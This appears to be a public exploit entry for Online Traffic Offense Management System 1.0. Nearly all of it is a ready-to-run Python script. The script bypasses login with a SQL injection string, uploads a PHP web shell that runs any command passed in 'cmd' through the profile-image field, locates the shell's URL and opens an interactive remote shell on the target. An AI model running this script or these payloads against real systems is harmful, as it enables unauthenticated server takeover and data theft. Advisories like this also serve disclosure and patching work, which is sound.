# Exploit Title: Online Traffic Offense Management System 1.0 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 20-08-2021
# Exploit Author: Halit AKAYDIN (hLtAkydn)
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/php/14909/online-traffic-offense-management-system-php-free-source-code.html
# Version: V1
# Category: Webapps
# Tested on: Linux/Windows

# Online Traffic Offense Management System
# contains a file upload vulnerability that allows for remote 
# code execution against the target.  This exploit requires 
# the user to be authenticated, but a SQL injection in the login form 
# allows the authentication controls to be bypassed
# File uploaded from "/admin/?page=user" has no validation check
# and the directory it is placed in allows for execution of PHP code.


#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

# Renkli çıktılar için
class Colors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

print(f"{Colors.BOLD}--- Traffic Offense Management System RCE (Python 3) ---{Colors.ENDC}")

# URL'i al (Sonunda / olup olmamasını dert etme)
url = input("Target URL (e.g. http://10.10.10.10/management): ").strip().rstrip('/')

if not url.startswith(('http://', 'https://')):
    url = "http://" + url

# PHP Shell Payload
payload_filename = "pwn.php"
# Basit ama etkili shell
payload_content = "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; die; } ?>"

session = requests.Session()

# 1. Aşama: Login Bypass
print(f"[*] Attempting SQL Injection Login Bypass...")
login_url = url + "/classes/Login.php?f=login"
login_data = {
    "username": "'' OR 1=1-- '", 
    "password": "'' OR 1=1-- '"
}

try:
    # Login isteği
    r_login = session.post(login_url, data=login_data)
    
    # JSON cevabını kontrol et
    if 'status":"success' in r_login.text or r_login.json().get('status') == 'success':
        print(f"{Colors.OKGREEN}[+] Login Bypass Successful!{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}[-] Login Failed! Response: {r_login.text}{Colors.ENDC}")
        sys.exit(1)

    # 2. Aşama: Kullanıcı Bilgilerini Çekme (Admin Panelinden)
    print("[*] Retrieving user details for upload...")
    user_page_url = url + "/admin/?page=user"
    r_user_page = session.get(user_page_url)
    
    soup = BeautifulSoup(r_user_page.text, 'html.parser')
    
    try:
        userid = soup.find('input', {'name':'id'}).get("value")
        firstname = soup.find('input', {'id':'firstname'}).get("value")
        lastname = soup.find('input', {'id':'lastname'}).get("value")
        username = soup.find('input', {'id':'username'}).get("value")
    except AttributeError:
        print(f"{Colors.FAIL}[-] Could not parse user details. Are you sure the path is correct?{Colors.ENDC}")
        sys.exit(1)

    # 3. Aşama: Shell Yükleme
    print("[*] Uploading PHP Shell...")
    upload_url = url + "/classes/Users.php?f=save"
    
    # Multipart Form Data
    multipart_data = {
        "id": (None, userid),
        "firstname": (None, firstname),
        "lastname": (None, lastname),
        "username": (None, username),
        "password": (None, ""), # Şifreyi boş geçiyoruz
    }
    
    # Dosyayı "img" parametresine gömüyoruz
    files = {
        'img': (payload_filename, payload_content, 'application/x-php')
    }

    # Headerları requests kendisi halledecek (boundary vs.)
    r_upload = session.post(upload_url, data=multipart_data, files=files)

    if r_upload.text == "1":
        print(f"{Colors.OKGREEN}[+] Shell Uploaded Successfully!{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}[-] Upload Failed. Response: {r_upload.text}{Colors.ENDC}")
        # Bazen 1 dönmese de yüklüyor, devam edelim...

    # 4. Aşama: Shell Yolunu Bulma
    print("[*] Finding shell path...")
    # Sayfayı yenileyip profil fotosunun (bizim shell) yoluna bakıyoruz
    r_refresh = session.get(user_page_url)
    soup_refresh = BeautifulSoup(r_refresh.text, 'html.parser')
    
    # Profil resmi id='cimg' olan element
    shell_img_tag = soup_refresh.find('img', {'id':'cimg'})
    
    if not shell_img_tag:
        print(f"{Colors.FAIL}[-] Could not find the uploaded shell image tag.{Colors.ENDC}")
        sys.exit(1)

    relative_path = shell_img_tag.get("src") # Örnek: /management/uploads/123_pwn.php
    
    # HATA ÇÖZÜMÜ BURADA:
    # URL'i parçala ve domain kısmını al (http://10.10.10.10:445)
    parsed_url = urlparse(url)
    base_domain = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Eğer gelen path zaten tam URL ise elleme, değilse birleştir
    if relative_path.startswith("http"):
        shell_full_url = relative_path
    else:
        # relative path genelde / ile başlar ama emin olalım
        if not relative_path.startswith('/'):
            relative_path = '/' + relative_path
        # Burada urljoin yerine basit string birleştirme daha güvenli olabilir çünkü
        # scriptin çalıştığı base path (/management) ile root path karışabilir.
        # En garantisi: base_domain + relative_path
        shell_full_url = base_domain + relative_path

    print(f"{Colors.OKGREEN}[+] Shell URL found: {shell_full_url}{Colors.ENDC}")
    print(f"{Colors.BOLD}--- Interactive Shell (Type 'exit' to quit) ---{Colors.ENDC}")

    # 5. Aşama: Komut Döngüsü
    while True:
        cmd = input(f"{Colors.WARNING}Shell$ {Colors.ENDC}")
        if cmd.lower() in ['exit', 'quit']:
            break
            
        try:
            # Komutu gönder
            r_cmd = requests.post(shell_full_url, data={'cmd': cmd}, timeout=10)
            
            # <pre> taglarını temizle
            output = r_cmd.text.replace("<pre>", "").replace("</pre>", "")
            print(output)
        except Exception as e:
            print(f"Error executing command: {e}")

except Exception as e:
    print(f"{Colors.FAIL}An error occurred: {e}{Colors.ENDC}")
